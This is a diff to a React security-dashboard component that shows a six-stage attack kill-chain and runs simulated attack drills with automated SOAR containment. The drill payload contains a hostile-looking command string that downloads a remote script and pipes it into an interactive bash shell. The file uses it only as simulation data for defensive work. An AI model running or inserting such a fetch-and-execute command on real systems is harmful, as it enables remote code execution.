@@ -58,9 +58,53 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
   const [executingAction, setExecutingAction] = useState(null);
   const [simulating, setSimulating] = useState(false);
 
-  // Attack cycle state: 'idle' | 'attack' | 'mitigating' | 'safe'
+  // Attack cycle state:
+  // 1. 'idle'       -> CYAN  (Safe / No attack is there)
+  // 2. 'attack'     -> RED   (Attack started / in progress)
+  // 3. 'safe'       -> GREEN (Attack taken down / mitigated; auto-reverts to CYAN after 30s)
   const [attackState, setAttackState] = useState('idle');
+  const [safeTimerCountdown, setSafeTimerCountdown] = useState(0);
   const timersRef = useRef([]);
+  const autoToCyanTimerRef = useRef(null);
+  const countdownIntervalRef = useRef(null);
+
+  // 30-second timer: Green (attack taken down) automatically turns into Cyan (safe, no attack)
+  useEffect(() => {
+    if (attackState === 'safe') {
+      setSafeTimerCountdown(30);
+
+      if (autoToCyanTimerRef.current) clearTimeout(autoToCyanTimerRef.current);
+      if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
+
+      countdownIntervalRef.current = setInterval(() => {
+        setSafeTimerCountdown((prev) => {
+          if (prev <= 1) {
+            clearInterval(countdownIntervalRef.current);
+            return 0;
+          }
+          return prev - 1;
+        });
+      }, 1000);
+
+      autoToCyanTimerRef.current = setTimeout(() => {
+        setAttackState('idle');
+        setContainmentStates({});
+        setSafeTimerCountdown(0);
+        toast('💎 30s Safe Window Elapsed: System returned to CYAN monitoring state.', {
+          duration: 3500,
+        });
+      }, 30000);
+    } else {
+      setSafeTimerCountdown(0);
+      if (autoToCyanTimerRef.current) clearTimeout(autoToCyanTimerRef.current);
+      if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
+    }
+
+    return () => {
+      if (autoToCyanTimerRef.current) clearTimeout(autoToCyanTimerRef.current);
+      if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
+    };
+  }, [attackState]);
 
   // Ref to always hold the current activeKey — fixes stale closure in socket handlers
   const activeKeyRef = useRef('live_feed');
@@ -68,8 +112,7 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
   // When parent resets to idle (e.g. header Safe—Reset button), clear all containment flags
   useEffect(() => {
     if (!resetSignal) return; // 0 = initial mount, skip
-    setAttackState('idle');
-    setContainmentStates({});
+    handleResetToIdle();
   }, [resetSignal]);
 
   // Notify parent (DashboardPage header) whenever attackState changes
@@ -83,6 +126,8 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
   useEffect(() => {
     return () => {
       timersRef.current.forEach(clearTimeout);
+      if (autoToCyanTimerRef.current) clearTimeout(autoToCyanTimerRef.current);
+      if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
     };
   }, []);
 
@@ -114,7 +159,24 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
   // Listen for live socket threats
   useEffect(() => {
     if (!lastFinding) return;
-    setRecentThreats((prev) => [lastFinding, ...prev.slice(0, 9)]);
+    setRecentThreats((prev) => [lastFinding, ...prev.filter((t) => t._id !== lastFinding._id).slice(0, 9)]);
+
+    const isSimulated = lastFinding.rawData?.drill || lastFinding.type?.includes('simulat');
+    if (isSimulated) {
+      tacticalAudio.playAlarm();
+      setAttackState('attack');
+      setContainmentStates((prev) => ({
+        ...prev,
+        [activeKeyRef.current]: { blocked: false, killed: false, isolated: false, rearmed: false },
+        live_feed: { blocked: false, killed: false, isolated: false, rearmed: false },
+      }));
+      toast('🚨 SIMULATION ATTACK DETECTED: Kill-Chain actively streaming vector progression!', {
+        icon: '⚡',
+        duration: 4500,
+      });
+      return;
+    }
+
     tacticalAudio.playRadarPing();
 
     // New critical/high threat → if not already in safe state, go to 'attack'
@@ -134,9 +196,93 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
     }
   }, [lastFinding]);
 
-  // Listen for automated defense actions executed over Socket.IO
+  // Listen for real-time simulation, incident, and defense events over Socket.IO
   useEffect(() => {
     if (!subscribe) return;
+
+    // Real-time drill simulation start broadcast from backend
+    const unsubSim = subscribe('simulation:started', (simData) => {
+      if (!simData) return;
+      tacticalAudio.playAlarm();
+      setAttackState('attack');
+
+      const threat = simData.threat;
+      const incident = simData.incident;
+
+      if (threat) {
+        setRecentThreats((prev) => [threat, ...prev.filter((t) => t._id !== threat._id).slice(0, 9)]);
+      }
+      if (incident) {
+        setIncidents((prev) => [incident, ...prev.filter((i) => i._id !== incident._id)]);
+        setSelectedIncidentId(incident._id);
+        activeKeyRef.current = incident._id;
+      }
+      const targetKey = incident?._id || 'live_feed';
+      setContainmentStates((prev) => ({
+        ...prev,
+        [targetKey]: { blocked: false, killed: false, isolated: false, rearmed: false },
+        live_feed: { blocked: false, killed: false, isolated: false, rearmed: false },
+      }));
+
+      toast('🚨 SIMULATION ATTACK ACTIVE: Cyber Kill-Chain initiated!', {
+        icon: '⚡',
+        duration: 4500,
+      });
+    });
+
+    // New incident created in real time (e.g. correlated simulation)
+    const unsubIncNew = subscribe('incident:new', (newInc) => {
+      if (!newInc) return;
+      setIncidents((prev) => [newInc, ...prev.filter((i) => i._id !== newInc._id)]);
+      if (
+        newInc.title?.toLowerCase().includes('simulation') ||
+        newInc.title?.toLowerCase().includes('drill') ||
+        newInc.severity === 'critical'
+      ) {
+        setSelectedIncidentId(newInc._id);
+        activeKeyRef.current = newInc._id;
+      }
+    });
+
+    // Incident status or notes updated in real time
+    const unsubIncUpdated = subscribe('incident:updated', (updatedInc) => {
+      if (!updatedInc) return;
+      setIncidents((prev) => prev.map((i) => (i._id === updatedInc._id ? { ...i, ...updatedInc } : i)));
+      if (updatedInc.status === 'resolved') {
+        setAttackState('safe');
+        setContainmentStates((prev) => ({
+          ...prev,
+          [updatedInc._id]: { blocked: true, killed: true, isolated: true, rearmed: true },
+          [activeKeyRef.current]: { blocked: true, killed: true, isolated: true, rearmed: true },
+          live_feed: { blocked: true, killed: true, isolated: true, rearmed: true },
+        }));
+      }
+    });
+
+    // Attack taken down & incident resolved event
+    const unsubIncResolved = subscribe('incident:resolved', (resData) => {
+      if (!resData?.incidentId) return;
+      setIncidents((prev) =>
+        prev.map((i) =>
+          i._id === resData.incidentId
+            ? { ...i, status: 'resolved', notes: resData.incident?.notes || i.notes, summary: resData.incident?.summary || i.summary }
+            : i
+        )
+      );
+      setAttackState('safe');
+      setContainmentStates((prev) => ({
+        ...prev,
+        [resData.incidentId]: { blocked: true, killed: true, isolated: true, rearmed: true },
+        [activeKeyRef.current]: { blocked: true, killed: true, isolated: true, rearmed: true },
+        live_feed: { blocked: true, killed: true, isolated: true, rearmed: true },
+      }));
+      tacticalAudio.playNeutralized();
+      toast.success(
+        `🛡️ Attack Taken Down: Incident #${resData.incidentId.slice(-6)} resolved via ${resData.actionType?.toUpperCase() || 'SOAR'}!`,
+        { duration: 5500 }
+      );
+    });
+
     const unsubExecuted = subscribe('defense:action:executed', (action) => {
       if (!action) return;
       const key = activeKeyRef.current;
@@ -151,9 +297,15 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
           isolated: action.actionType === 'isolate_host' ? true : prev[key]?.isolated,
           rearmed: action.actionType === 'quarantine_file' ? true : prev[key]?.rearmed,
         },
+        live_feed: {
+          ...prev.live_feed,
+          [action.actionType]: true,
+          killed: action.actionType === 'kill_process' ? true : prev.live_feed?.killed,
+          blocked: action.actionType === 'block_ip' ? true : prev.live_feed?.blocked,
+        },
       }));
       setAttackState('safe');
-      toast.success(`🛡️ SOAR Automation Enforced: ${action.actionType?.replace(/_/g, ' ').toUpperCase()} · Safe State`);
+      toast.success(`🛡️ SOAR Automation Enforced: ${action.actionType?.replace(/_/g, ' ').toUpperCase()} · Attack Taken Down`);
     });
 
     const unsubConfirmed = subscribe('defense:action:confirmed', (receipt) => {
@@ -175,12 +327,21 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
           [receipt.actionType]: true,
           [flagKey]: true,
         },
+        live_feed: {
+          ...prev.live_feed,
+          [receipt.actionType]: true,
+          [flagKey]: true,
+        },
       }));
       setAttackState('safe');
-      toast.success(`🤖 Autopilot Confirmed: ${receipt.actionType?.replace(/_/g, ' ').toUpperCase()} · System Secured`);
+      toast.success(`🤖 Autopilot Confirmed: ${receipt.actionType?.replace(/_/g, ' ').toUpperCase()} · Host Secured`);
     });
 
     return () => {
+      unsubSim();
+      unsubIncNew();
+      unsubIncUpdated();
+      unsubIncResolved();
       unsubExecuted();
       unsubConfirmed();
     };
@@ -238,9 +399,13 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
   activeKeyRef.current = activeKey;
   const state = containmentStates[activeKey] || {};
 
-  // Determine overall safe state
-  const isSafe = attackState === 'safe' || Boolean(state.killed && (state.blocked || state.isolated));
-  const isAttackHappening = attackState === 'attack' || attackState === 'unsafe' || (!isSafe && recentThreats.length > 0 && !state.killed);
+  // Attack cycle states:
+  // 1. Safe / No attack: attackState === 'idle' -> CYAN
+  // 2. Attack in progress: attackState === 'attack' || attackState === 'unsafe' || attackState === 'mitigating' -> RED
+  // 3. Attack taken down: attackState === 'safe' -> GREEN (30-second cooldown, then returns to 'idle' CYAN)
+  const isUnderAttack = attackState === 'attack' || attackState === 'unsafe' || attackState === 'mitigating';
+  const isSafe = attackState === 'safe';
+  const isAttackHappening = isUnderAttack;
 
   // Build the 6 sequential stages of the attack kill-chain
   const stages = useMemo(() => [
@@ -250,12 +415,12 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
       name: 'Recon & Ingress',
       tactic: 'Reconnaissance / Initial Access',
       mitre: 'T1595 / T1190',
-      status: (isSafe || state.blocked) ? 'neutralized' : 'active',
-      statusLabel: (isSafe || state.blocked) ? 'IP BLOCKED' : 'MALICIOUS',
+      status: isSafe ? 'neutralized' : isUnderAttack ? 'active' : 'idle',
+      statusLabel: isSafe ? 'IP BLOCKED' : isUnderAttack ? 'MALICIOUS' : 'SECURE',
       title: activeChain.attackerIp,
       subtitle: activeChain.attackerLocation,
       detail: `Originator IP: ${activeChain.attackerIp} (${activeChain.attackerIsp}). External automated probe searching for vulnerable exposed services.`,
-      actionLabel: (isSafe || state.blocked) ? 'Firewall Drop Active ✓' : 'Block IP via SOAR',
+      actionLabel: isSafe ? 'Firewall Drop Active ✓' : isUnderAttack ? 'Block IP via SOAR' : 'Filter Ingress IP',
       actionType: 'block_ip',
       target: activeChain.attackerIp,
       icon: Skull,
@@ -267,8 +432,8 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
       name: 'Weaponization',
       tactic: 'Execution / Ingress Payload',
       mitre: 'T1203 / T1059',
-      status: (isSafe || state.blocked) ? 'mitigated' : 'active',
-      statusLabel: (isSafe || state.blocked) ? 'INTERCEPTED' : 'EXPLOITED',
+      status: isSafe ? 'neutralized' : isUnderAttack ? 'active' : 'idle',
+      statusLabel: isSafe ? 'INTERCEPTED' : isUnderAttack ? 'EXPLOITED' : 'INSPECTED',
       title: 'Malicious Web Vector',
       subtitle: activeChain.protocol,
       detail: `Injected command sequence encapsulated in HTTP POST. Technique: ${activeChain.technique}. WAF filter anomaly detected.`,
@@ -282,12 +447,12 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
       name: 'Host Execution',
       tactic: 'Execution',
       mitre: 'T1059.004',
-      status: (isSafe || state.killed) ? 'neutralized' : 'active',
-      statusLabel: (isSafe || state.killed) ? 'TERMINATED' : 'EXECUTING',
+      status: isSafe ? 'neutralized' : isUnderAttack ? 'active' : 'idle',
+      statusLabel: isSafe ? 'TERMINATED' : isUnderAttack ? 'EXECUTING' : 'MONITORED',
       title: `PID: ${activeChain.pid}`,
       subtitle: activeChain.processName,
       detail: `Local interpreter spawned child process: "${activeChain.processName}" (PID ${activeChain.pid}). High entropy execution string observed.`,
-      actionLabel: (isSafe || state.killed) ? 'Process Killed ✓' : 'SIGKILL Process Tree',
+      actionLabel: isSafe ? 'Process Killed ✓' : isUnderAttack ? 'SIGKILL Process Tree' : 'Audit Process PID',
       actionType: 'kill_process',
       target: `PID: ${activeChain.pid}`,
       icon: Terminal,
@@ -299,8 +464,8 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
       name: 'Privilege Escalation',
       tactic: 'Privilege Escalation',
       mitre: 'T1548.003 (Sudo Rights)',
-      status: (isSafe || state.killed) ? 'prevented' : 'warning',
-      statusLabel: (isSafe || state.killed) ? 'BLOCKED' : 'ATTEMPTED',
+      status: isSafe ? 'neutralized' : isUnderAttack ? 'active' : 'idle',
+      statusLabel: isSafe ? 'BLOCKED' : isUnderAttack ? 'ATTEMPTED' : 'LOCKED',
       title: 'Elevated Tokens',
       subtitle: 'uid=0(root) gid=0(wheel)',
       detail: 'Adversary attempted sudo credential verification and PAM authentication bypass to attain administrator root privileges.',
@@ -314,12 +479,12 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
       name: 'Defense Evasion',
       tactic: 'Credential Access',
       mitre: 'T1552.001 (Honeytoken Breach)',
-      status: (isSafe || state.rearmed) ? 'neutralized' : (state.isolated ? 'quarantined' : 'active'),
-      statusLabel: (isSafe || state.rearmed) ? 'DECOY RESET' : 'CANARY BREACHED',
+      status: isSafe ? 'neutralized' : isUnderAttack ? 'active' : 'idle',
+      statusLabel: isSafe ? 'DECOY RESET' : isUnderAttack ? 'CANARY BREACHED' : 'ARMED',
       title: '~/.eye/canary.env',
       subtitle: 'AWS Decoy Honeytoken Accessed',
       detail: 'Unsolicited access to decoy AWS credentials detected. Honeytoken canary tripwire tripped! Legitimate software never touches this decoy file.',
-      actionLabel: (isSafe || state.rearmed) ? 'Canary Armed ✓' : 'Reset Decoy Honeytoken',
+      actionLabel: isSafe ? 'Canary Armed ✓' : isUnderAttack ? 'Reset Decoy Honeytoken' : 'Verify Canary Decoy',
       actionType: 'rearm_honeytoken',
       target: '~/.eye/canary.env',
       icon: Zap,
@@ -331,18 +496,18 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
       name: 'C2 & Exfiltration',
       tactic: 'Command & Control',
       mitre: 'T1071.001 (C2 Beacon)',
-      status: (isSafe || state.isolated) ? 'neutralized' : 'critical',
-      statusLabel: (isSafe || state.isolated) ? 'ISOLATED' : 'ACTIVE BEACON',
+      status: isSafe ? 'neutralized' : isUnderAttack ? 'active' : 'idle',
+      statusLabel: isSafe ? 'ISOLATED' : isUnderAttack ? 'ACTIVE BEACON' : 'STANDBY',
       title: activeChain.targetAsset,
       subtitle: 'Port 4444 C2 Beaconing',
       detail: `Outbound socket connection to external Command & Control beacon. Targeted asset: ${activeChain.targetAsset}.`,
-      actionLabel: (isSafe || state.isolated) ? 'Host Isolated ✓' : 'Isolate Host Network',
+      actionLabel: isSafe ? 'Host Isolated ✓' : isUnderAttack ? 'Isolate Host Network' : 'Network Baseline OK',
       actionType: 'isolate_host',
       target: activeChain.targetAsset,
       icon: Database,
       color: 'cyan',
     },
-  ], [activeChain, state, isSafe]);
+  ], [activeChain, state, isSafe, isUnderAttack]);
 
   // Execute active countermeasure (manual click)
   const handleContainment = async (actionType, target, label) => {
@@ -359,16 +524,13 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
       if (res.data?.status === 'success') {
         tacticalAudio.playNeutralized();
         toast.success(`🛡️ Countermeasure Enforced: ${label}`);
-        setContainmentStates((prev) => {
-          const updated = {
-            ...prev,
-            [activeKey]: {
-              ...prev[activeKey],
-              [actionType]: true,
-            },
-          };
-          return updated;
-        });
+        setContainmentStates((prev) => ({
+          ...prev,
+          [activeKey]: {
+            ...prev[activeKey],
+            [actionType]: true,
+          },
+        }));
 
         // If process killed or IP blocked, set safe state (turning buttons green)
         if (actionType === 'kill_process' || actionType === 'block_ip') {
@@ -382,16 +544,16 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
     }
   };
 
-  // Reset from safe/unsafe back to idle (clear all green indicators)
+  // Reset back to idle (Cyan safe mode)
   const handleResetToIdle = () => {
     timersRef.current.forEach(clearTimeout);
     timersRef.current = [];
+    if (autoToCyanTimerRef.current) clearTimeout(autoToCyanTimerRef.current);
+    if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
+    setSafeTimerCountdown(0);
     setAttackState('idle');
-    setContainmentStates((prev) => ({
-      ...prev,
-      [activeKeyRef.current]: { blocked: false, killed: false, isolated: false, rearmed: false },
-    }));
-    toast('🔄 State reset — system returned to idle monitoring mode.', { icon: '⬜', duration: 2500 });
+    setContainmentStates({});
+    toast('💎 System returned to CYAN safe monitoring mode.', { duration: 2500 });
   };
 
   // Full Attack Simulation & Automation Kill-Chain Cycle
@@ -422,14 +584,25 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
       const simIp = '185.193.65.' + Math.floor(Math.random() * 200 + 10);
       const simPid = Math.floor(Math.random() * 8000 + 1000);
 
-      await threatApi.simulate({
+      const simRes = await threatApi.simulate({
         type: 'command_injection',
         severity: 'critical',
         sourceIp: simIp,
         sourcePid: simPid,
+        ip: simIp,
+        pid: simPid,
+        process: 'curl -s http://185.193.65.19/drill.sh | bash -i',
         description: `Simulated APT29 command injection & reverse shell beacon (PID ${simPid})`,
         payload: 'curl -s http://185.193.65.19/drill.sh | bash -i',
       });
+
+      const simIncident = simRes.data?.data?.incident;
+      const simThreat = simRes.data?.data?.threat;
+      if (simIncident?._id) {
+        setSelectedIncidentId(simIncident._id);
+        activeKeyRef.current = simIncident._id;
+        setIncidents((prev) => [simIncident, ...prev.filter((i) => i._id !== simIncident._id)]);
+      }
 
       await fetchData();
 
@@ -446,37 +619,46 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
       // 3. Automation KILLS the attack -> State becomes SAFE, ALL BUTTONS TURN GREEN!
       const t2 = setTimeout(async () => {
         try {
+          const currentIncId = simIncident?._id || (selectedIncidentId !== 'live_feed' ? selectedIncidentId : null);
+          const currentThrId = simThreat?._id || null;
+
           await Promise.allSettled([
             defenseApi.contain({
               actionType: 'kill_process',
               target: String(simPid),
+              incidentId: currentIncId,
+              threatId: currentThrId,
               reason: 'SOAR Autonomous Process Termination (Kill-Chain Mitigated)',
               executedBy: 'automation',
             }),
             defenseApi.contain({
               actionType: 'block_ip',
               target: simIp,
+              incidentId: currentIncId,
+              threatId: currentThrId,
               reason: 'SOAR Autonomous Ingress Drop (IP Blocked)',
               executedBy: 'automation',
             }),
           ]);
 
-          // Set all containment flags to true (Safe State)
+          const key = activeKeyRef.current;
           setContainmentStates((prev) => ({
             ...prev,
-            [activeKey]: { blocked: true, killed: true, isolated: true, rearmed: true },
+            [key]: { blocked: true, killed: true, isolated: true, rearmed: true },
+            live_feed: { blocked: true, killed: true, isolated: true, rearmed: true },
           }));
 
           setAttackState('safe');
           tacticalAudio.playNeutralized();
-          toast.success('🛡️ AUTOMATION KILLED ATTACK: Threat neutralized. System in SAFE STATE!', {
+          toast.success('🛡️ ATTACK TAKEN DOWN: Threat neutralized. Correlated incident marked RESOLVED!', {
             duration: 6000,
           });
         } catch {
           // Fallback safe state
           setContainmentStates((prev) => ({
             ...prev,
-            [activeKey]: { blocked: true, killed: true, isolated: true, rearmed: true },
+            [activeKeyRef.current]: { blocked: true, killed: true, isolated: true, rearmed: true },
+            live_feed: { blocked: true, killed: true, isolated: true, rearmed: true },
           }));
           setAttackState('safe');
         } finally {
@@ -492,25 +674,18 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
     }
   };
 
-  // Status badge style helper
-  const getStatusBadge = (status, label) => {
-    switch (status) {
-      case 'neutralized':
-      case 'mitigated':
-      case 'prevented':
-      case 'quarantined':
-        return 'bg-emerald-950/80 border-emerald-500/60 text-emerald-300';
-      case 'warning':
-        return isSafe
-          ? 'bg-emerald-950/80 border-emerald-500/60 text-emerald-300'
-          : 'bg-amber-950/70 border-amber-700/60 text-amber-300';
-      case 'critical':
-      case 'active':
-      default:
-        return isSafe
-          ? 'bg-emerald-950/80 border-emerald-500/60 text-emerald-300'
-          : 'bg-red-950/80 border-red-700/80 text-red-300 animate-pulse';
+  // Status badge style helper:
+  // - GREEN when attack taken down (safe state)
+  // - RED when attack is active
+  // - CYAN when idle / normal monitoring
+  const getStatusBadge = () => {
+    if (isSafe) {
+      return 'bg-emerald-950/90 border-emerald-500/70 text-emerald-300';
     }
+    if (isUnderAttack) {
+      return 'bg-red-950/90 border-red-700/80 text-red-300 animate-pulse';
+    }
+    return 'bg-cyan-950/80 border-cyan-500/60 text-cyan-300';
   };
 
   const activeNode = stages[selectedNodeIndex] || stages[0];
@@ -522,9 +697,11 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
         <div className="flex items-center gap-2.5">
           <div
             className={`p-2 rounded-lg border shadow-sm transition-colors ${
-              isSafe
-                ? 'bg-emerald-950/60 border-emerald-700/50 text-emerald-400'
-                : 'bg-purple-950/60 border-purple-800/40 text-purple-400'
+              isUnderAttack
+                ? 'bg-red-950/70 border-red-700/60 text-red-400'
+                : isSafe
+                ? 'bg-emerald-950/70 border-emerald-700/60 text-emerald-400'
+                : 'bg-cyan-950/70 border-cyan-700/60 text-cyan-400'
             }`}
           >
             <GitBranch className="w-4 h-4" />
@@ -535,26 +712,25 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
                 LIVE KILL-CHAIN ATTACK GRAPH
               </h3>
 
-              {/* Dynamic Status Pill: Green when Safe State, Red when Attack is happening */}
+              {/* Dynamic Status Pill:
+                  - CYAN when safe / no attack
+                  - RED when attack started
+                  - GREEN when attack is taken down (30s cooldown before auto-turning cyan)
+              */}
               {isSafe ? (
-                <span className="flex items-center gap-1.5 text-[11px] font-mono text-emerald-300 bg-emerald-950/80 px-2.5 py-0.5 rounded-full border border-emerald-500/60 shadow-sm shadow-emerald-950/50">
+                <span className="flex items-center gap-1.5 text-[11px] font-mono text-emerald-300 bg-emerald-950/90 px-2.5 py-0.5 rounded-full border border-emerald-500/70 shadow-sm shadow-emerald-950/60 animate-fade-in">
                   <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
-                  CONTAINED &amp; NEUTRALIZED · SAFE STATE
+                  ATTACK TAKEN DOWN · SAFE ({safeTimerCountdown}s ➔ CYAN)
                 </span>
-              ) : attackState === 'mitigating' ? (
-                <span className="flex items-center gap-1.5 text-[11px] font-mono text-amber-300 bg-amber-950/80 px-2.5 py-0.5 rounded-full border border-amber-600/60 shadow-sm animate-pulse">
-                  <RotateCcw className="w-3.5 h-3.5 text-amber-400 animate-spin" />
-                  AUTOMATION KILLING THREAT...
-                </span>
-              ) : attackState === 'unsafe' ? (
+              ) : isUnderAttack ? (
                 <span className="flex items-center gap-1.5 text-[11px] font-mono text-red-300 bg-red-950/90 px-2.5 py-0.5 rounded-full border border-red-600/90 shadow-sm shadow-red-950/60 animate-pulse">
-                  <ShieldAlert className="w-3.5 h-3.5 text-red-400 animate-pulse" />
-                  LIVE THREAT DETECTED · UNSAFE STATE
+                  <Flame className="w-3.5 h-3.5 text-red-400 animate-pulse" />
+                  {attackState === 'mitigating' ? 'SOAR MITIGATING ATTACK...' : 'ATTACK ACTIVE · RED ALERT'}
                 </span>
               ) : (
-                <span className="flex items-center gap-1.5 text-[11px] font-mono text-red-300 bg-red-950/80 px-2.5 py-0.5 rounded-full border border-red-700/80 shadow-sm shadow-red-950/50 animate-pulse">
-                  <Flame className="w-3.5 h-3.5 text-red-400 animate-pulse" />
-                  ACTIVE THREAT CHAIN · STAGE 6 REACHED
+                <span className="flex items-center gap-1.5 text-[11px] font-mono text-cyan-300 bg-cyan-950/80 px-2.5 py-0.5 rounded-full border border-cyan-500/60 shadow-sm shadow-cyan-950/50">
+                  <Shield className="w-3.5 h-3.5 text-cyan-400" />
+                  SAFE · NO ATTACK DETECTED · CYAN MONITORING
                 </span>
               )}
             </div>
@@ -579,6 +755,7 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
               </option>
               {incidents.map((inc) => (
                 <option key={inc._id} value={inc._id} className="bg-surface-900 text-slate-200">
+                  {inc.status === 'resolved' ? '✓ [TAKEN DOWN] ' : '🚨 [ACTIVE] '}
                   {inc.title?.slice(0, 26)} ({inc.severity})
                 </option>
               ))}
@@ -587,47 +764,95 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
 
           {/* 
             Simulate Attack Button:
+            - CYAN when safe / no attack
             - RED when attack is happening / simulation started
-            - GREEN when safe state after automation killed it
+            - GREEN when safe state after automation killed it (lasts 30s)
           */}
           <button
             onClick={handleQuickSimulate}
             disabled={simulating}
             className={`px-3 py-1 text-xs font-mono font-bold rounded-lg transition-all flex items-center gap-1.5 shadow-md ${
-              attackState === 'attack' || attackState === 'unsafe'
+              isUnderAttack
                 ? 'bg-red-600 hover:bg-red-500 text-white border border-red-500 shadow-lg shadow-red-950/80 animate-pulse'
-                : attackState === 'mitigating'
-                ? 'bg-amber-600/30 hover:bg-amber-600/40 text-amber-200 border border-amber-500/50 animate-pulse'
                 : isSafe
-                ? 'bg-emerald-950/80 hover:bg-emerald-900 text-emerald-300 border border-emerald-500/60 shadow-md shadow-emerald-950/50'
-                : 'bg-red-950/80 hover:bg-red-900/90 text-red-200 border border-red-700/70 shadow-sm'
+                ? 'bg-emerald-950/90 hover:bg-emerald-900 text-emerald-300 border border-emerald-500/70 shadow-md shadow-emerald-950/60'
+                : 'bg-cyan-950/80 hover:bg-cyan-900/90 text-cyan-300 border border-cyan-500/60 shadow-md shadow-cyan-950/50'
             }`}
-            title={isSafe ? 'System safe. Click to simulate new attack.' : 'Inject simulated attack vector'}
+            title={
+              isSafe
+                ? `System safe for ${safeTimerCountdown}s. Click to simulate new attack.`
+                : isUnderAttack
+                ? 'Attack currently underway'
+                : 'Detonate simulated attack vector'
+            }
           >
-            {attackState === 'attack' || attackState === 'unsafe' ? (
+            {isUnderAttack ? (
               <>
                 <Flame className="w-3.5 h-3.5 text-white animate-bounce" />
-                <span>{attackState === 'unsafe' ? 'LIVE THREAT — UNSAFE' : 'Attack in Progress...'}</span>
-              </>
-            ) : attackState === 'mitigating' ? (
-              <>
-                <RotateCcw className="w-3.5 h-3.5 text-amber-300 animate-spin" />
-                <span>Automation Killing Threat...</span>
+                <span>{attackState === 'mitigating' ? 'Mitigating...' : 'Attack in Progress...'}</span>
               </>
             ) : isSafe ? (
               <>
                 <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
-                <span>Safe State (Simulate Again)</span>
+                <span>Attack Taken Down ({safeTimerCountdown}s)</span>
               </>
             ) : (
               <>
-                <Zap className="w-3.5 h-3.5 text-red-400" />
+                <Zap className="w-3.5 h-3.5 text-cyan-400" />
                 <span>Simulate Attack</span>
               </>
             )}
           </button>
         </div>
       </div>
+
+      {/* ── Real-Time Status Notification Banners ──────────────────── */}
+      {isUnderAttack && (
+        <div className="mb-4 p-3 rounded-xl bg-red-950/60 border border-red-600/70 flex items-center justify-between gap-3 text-red-300 shadow-md shadow-red-950/50 animate-pulse">
+          <div className="flex items-center gap-2.5 text-xs font-mono">
+            <Skull className="w-4 h-4 text-red-400 shrink-0 animate-bounce" />
+            <span>
+              <strong className="text-red-200">ATTACK STARTED (RED ALERT):</strong> Live exploit vector active across Kill-Chain. Attacker IP:{' '}
+              <span className="text-red-100 font-bold font-mono">{activeChain.attackerIp}</span> · Target PID:{' '}
+              <span className="text-red-100 font-bold font-mono">{activeChain.pid}</span>.
+            </span>
+          </div>
+          <span className="text-[10px] font-mono uppercase tracking-wider px-2 py-0.5 rounded bg-red-900/80 text-red-200 border border-red-500/50 shrink-0 font-bold">
+            STAGE 01 ➔ 06 ACTIVE
+          </span>
+        </div>
+      )}
+
+      {isSafe && (
+        <div className="mb-4 p-3 rounded-xl bg-emerald-950/60 border border-emerald-500/60 flex items-center justify-between gap-3 text-emerald-300 shadow-md shadow-emerald-950/40 animate-fade-in">
+          <div className="flex items-center gap-2.5 text-xs font-mono">
+            <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
+            <span>
+              <strong className="text-emerald-200">ATTACK TAKEN DOWN (GREEN STATE):</strong> SOAR Autonomous Countermeasure successfully executed! Incident is marked <strong className="underline text-emerald-100">RESOLVED</strong>. System will automatically transition to calm <strong className="text-cyan-300">CYAN</strong> state in <strong className="text-emerald-100 font-bold">{safeTimerCountdown}s</strong>.
+            </span>
+          </div>
+          <button
+            onClick={handleResetToIdle}
+            className="text-[11px] font-mono px-2.5 py-1 rounded bg-emerald-900/80 hover:bg-emerald-800 text-emerald-100 border border-emerald-500/60 transition-colors shrink-0 font-semibold"
+          >
+            Return to Cyan Now
+          </button>
+        </div>
+      )}
+
+      {!isUnderAttack && !isSafe && (
+        <div className="mb-4 p-2.5 rounded-xl bg-cyan-950/40 border border-cyan-600/40 flex items-center justify-between gap-3 text-cyan-300 shadow-sm shadow-cyan-950/30">
+          <div className="flex items-center gap-2 text-xs font-mono">
+            <Shield className="w-4 h-4 text-cyan-400 shrink-0" />
+            <span>
+              <strong className="text-cyan-200">SYSTEM SECURE (CYAN MODE):</strong> No active intrusions detected. Autonomous sensors listening on endpoint telemetry.
+            </span>
+          </div>
+          <span className="text-[10px] font-mono uppercase tracking-wider px-2 py-0.5 rounded bg-cyan-900/50 text-cyan-300 border border-cyan-600/40 shrink-0 font-semibold">
+            All 6 Stages Normal
+          </span>
+        </div>
+      )}
 
       {/* ── 6-Stage Visual Kill-Chain Track ──────────────────────────── */}
       <div className="bg-[#020617] rounded-xl border border-surface-700/70 p-4 select-none relative overflow-x-auto shadow-inner">
@@ -643,7 +868,6 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
         <div className="min-w-[980px] flex items-stretch justify-between gap-2 relative z-10 py-1">
           {stages.map((st, i) => {
